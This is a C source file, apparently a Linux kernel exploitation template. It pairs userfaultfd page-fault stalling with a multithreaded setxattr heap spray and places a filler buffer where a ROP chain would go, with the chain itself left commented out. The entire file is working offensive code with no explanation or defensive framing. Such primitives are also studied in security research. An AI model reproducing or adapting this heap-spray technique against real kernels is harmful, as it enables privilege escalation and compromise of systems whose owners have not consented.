#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <malloc.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <sys/xattr.h>
#include <poll.h>

#define COUNT 0x10
#define SPRAY_SIZE 0x100

struct elements {
    void *page;
    int size;
};

static void *fault_handler_thread(void *arg) {
    long uffd;
    static struct uffd_msg msg;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long)arg;

    for (;;) {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            perror("poll");

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0)
            perror("EOF");

        if (nread == -1)
            perror("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }
    }
}

static void *spray_thread(void *arg) {
    struct elements *_elements;

    _elements = (struct elements *)arg;

    setxattr("./", "v4bel", _elements->page, _elements->size, XATTR_CREATE);
}

int main() {
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    pthread_t thread[COUNT];
    pthread_t pf_hdr;
    int page_size;
    char *addr;
    int s, i, j;
    unsigned size;
    int boundary;
    char rop[SPRAY_SIZE];

    page_size = sysconf(_SC_PAGE_SIZE);

    addr = (char *)mmap((void *)0x700000000000,
                       page_size * COUNT * 2,
                       PROT_READ | PROT_WRITE,
                       MAP_FIXED | MAP_PRIVATE | MAP_ANON,
                       -1, 0);
    size = page_size * COUNT * 2;
    
    memset(rop, 0x41, sizeof(rop));
    /*
    rop[i++] = 0x...;
    rop[i++] = 0x...;
    rop[i++] = 0x...;
    */
    
    boundary = SPRAY_SIZE - 0x8;

    for (i=1; i<COUNT*2; i+=2) {
        memcpy(addr+(0x1000*i)-boundary, rop, boundary);
    }

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1) {
        perror("syscall : userfaultfd");
        return -1;
    }

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
        perror("ioctl() : UFFDIO_API");
        return -1;
    }

    uffdio_register.range.start = (unsigned long)addr;
    uffdio_register.range.len   = size;
    uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) {
        perror("ioctl() : UFFDIO_REGITER");
        return -1;
    }

    /* userfaultfd handling thread */
    s = pthread_create(&pf_hdr, NULL, fault_handler_thread, (void *)uffd);
    if (s != 0) {
        perror("pthread_create : page fault handling thread");
        return -1;
    }

    /* kernel heap spray */
    for(i=1, j=0; i<COUNT*2; i+=2,j++) {
        usleep(2000);

        struct elements _elements;
        _elements.page = addr+(0x1000*i)-boundary;
        _elements.size = SPRAY_SIZE;

        s = pthread_create(&thread[j], NULL, spray_thread, &_elements);
        if (s != 0) {
            perror("pthread_create : heap spray thread");
            return -1;
        }
    }

    sleep(2000);

    return 0;
}
